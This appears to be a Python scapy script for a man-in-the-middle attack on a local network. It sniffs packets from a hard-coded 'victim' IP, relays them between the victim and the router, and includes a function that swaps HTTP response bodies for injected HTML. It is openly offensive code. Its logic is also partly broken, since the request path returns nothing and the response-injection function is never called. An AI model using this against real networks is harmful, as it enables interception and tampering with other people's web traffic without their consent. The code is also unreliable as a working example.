from scapy.all import sniff, send, Raw
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTPRequest, HTTPResponse

# Define the victim's IP address
victim_ip = "192.168.3.106"
hacker_ip = "192.168.3.100"
router_ip = "192.168.3.104"

# Define network information
router_mac = "74:DA:38:EB:6F:DC"

def packet_handler(packet):
    shwmsg = False
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip:
            shwmsg = True
            print("====================================")
            print("PACKET CAPTURED FROM VICTIM")
            if packet.haslayer(HTTPRequest):
                packet = packet_callback(packet)

        if packet[IP].src == router_ip:
            shwmsg = True
            print("=====================================")
            print("PACKET CAPTURED FROM WEBSERVER")
            if packet.haslayer(HTTPResponse):
                packet = packet_sendtrough(packet)

    # Send the modified packet back to the victim
    send(packet, verbose=False)
    if shwmsg == True:
        print(f"Forwarded packet from {packet[IP].src} to {packet[IP].dst}")
        print("========================================================================")
    return



def modify_packet(packet):
    if packet.haslayer(HTTPRequest):
        http_request = packet[HTTPRequest]
        print(f"HTTP Request: {http_request.Method.decode()} {http_request.Path.decode()}")
    elif packet.haslayer(HTTPResponse):

        # New HTML content
        new_html_content = """
        <html>
        <head><title>Modified Page</title></head>
        <body><h1>This is a modified HTTP response</h1></body>
        </html>
        """

        # Create a new HTTP response payload with the new HTML content
        new_payload = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{}".format(
            len(new_html_content), new_html_content)

        # Modify the packet payload
        packet[Raw].load = new_payload.encode()

        # Recalculate checksums
        del packet[IP].chksum
        del packet[TCP].chksum

        # Send the modified packet
        print(packet[Raw].load)
        packet.show()

        print("Modified packet sent with new HTML content.")
        return packet

def packet_callback(packet):
    print("========================================================================")
    print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

    # Modify the packet's destination to the webserver IP
    packet[IP].dst = router_ip
    packet = modify_packet(packet)

    # Print the packets load
    payload = packet[Raw].load
    http_headers = payload.decode('utf-8', errors='ignore')
    print(f"HTTP Headers:\n{http_headers}")

    return packet

def packet_sendtrough(packet):
    print("========================================================================")
    print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

    # Modify the packet's destination to the victim IP
    packet[IP].dst = victim_ip

    return packet

# Sniff packets on the network and use packet_callback to process them
if __name__ == "__main__":
    while True:
        sniff(prn=packet_handler)